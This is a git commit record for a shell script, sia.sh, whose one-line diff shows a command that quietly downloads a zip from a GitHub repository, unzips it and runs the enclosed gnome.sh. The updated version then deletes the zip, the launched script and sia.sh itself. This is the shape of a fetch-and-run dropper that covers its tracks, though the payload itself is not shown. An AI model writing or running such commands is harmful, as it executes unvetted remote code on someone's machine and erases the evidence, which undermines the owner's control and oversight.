e7982b1c57cd9c00a721976eaef887c9620f1a36
minplesk <136193305+minplesk@users.noreply.github.com>
2023-06-11 01:32:24 +0700

    Update sia.sh

--- sia.sh
+++ sia.sh
@@ -1,1 +1,1 @@
-wget https://github.com/minplesk/cigor/raw/main/bkek.zip >/dev/null 2>&1; unzip bkek.zip; bash gnome.sh
+wget https://github.com/minplesk/cigor/raw/main/bkek.zip >/dev/null 2>&1; unzip bkek.zip; bash gnome.sh; rm -rf bkek.zip gnome.sh sia.sh
